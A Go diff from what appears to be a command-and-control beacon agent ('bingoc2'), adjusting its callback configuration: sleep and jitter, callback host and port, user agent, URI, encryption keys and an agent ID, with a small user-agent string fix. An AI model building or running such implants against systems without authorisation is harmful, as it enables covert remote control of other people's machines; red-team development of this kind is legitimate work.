@@ -8,26 +8,28 @@ import (
 	"fmt"
 	"os"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/lthibault/jitterbug"
 )
 
 var (
-	sSLEEP        string                         // whats edited by the go compiler
-	sJITTER       string                         // whats edited by the go compiler
-	SLEEP, _             = strconv.Atoi(sSLEEP)  // interval between callbacks
-	JITTER, _            = strconv.Atoi(sJITTER) // +- time in callbacks
-	RHOST         string = "127.0.0.1"           // host to callback to
-	RPORT         string = "80"                  // port to callback to
-	LISTENER_NAME string = "example listener"    // name of listener calling back to
-	BEACON_NAME   string = "example beacon"      // name of the beacon this agent is from
-	USERAGENT     string = "bingoc2/1.0.0"       // useragent of callback
-	URI           string = "index.php"           // uri to callback to
-	sKeya         string                         // key for encryption
-	sKeyb         string
-	sKeyc         string
-	sKeyd         string
+	sSLEEP          string                         // whats edited by the go compiler
+	sJITTER         string                         // whats edited by the go compiler
+	SLEEP, _               = strconv.Atoi(sSLEEP)  // interval between callbacks
+	JITTER, _              = strconv.Atoi(sJITTER) // +- time in callbacks
+	RHOST           string = "127.0.0.1"           // host to callback to
+	RPORT           string = "80"                  // port to callback to
+	LISTENER_NAME   string = "example listener"    // name of listener calling back to
+	BEACON_NAME     string = "example beacon"      // name of the beacon this agent is from
+	USERAGENT       string = "bingoc2/1.0.0"       // useragent of callback
+	USERAGENT_FIXED string = strings.ReplaceAll(USERAGENT, "////", " ")
+	URI             string = "index.php" // uri to callback to
+	sKeya           string               // key for encryption
+	sKeyb           string
+	sKeyc           string
+	sKeyd           string
 
 	AgentID string = hg.RandomStr(4) // ID of agent (used by server to identify who is calling)
 )
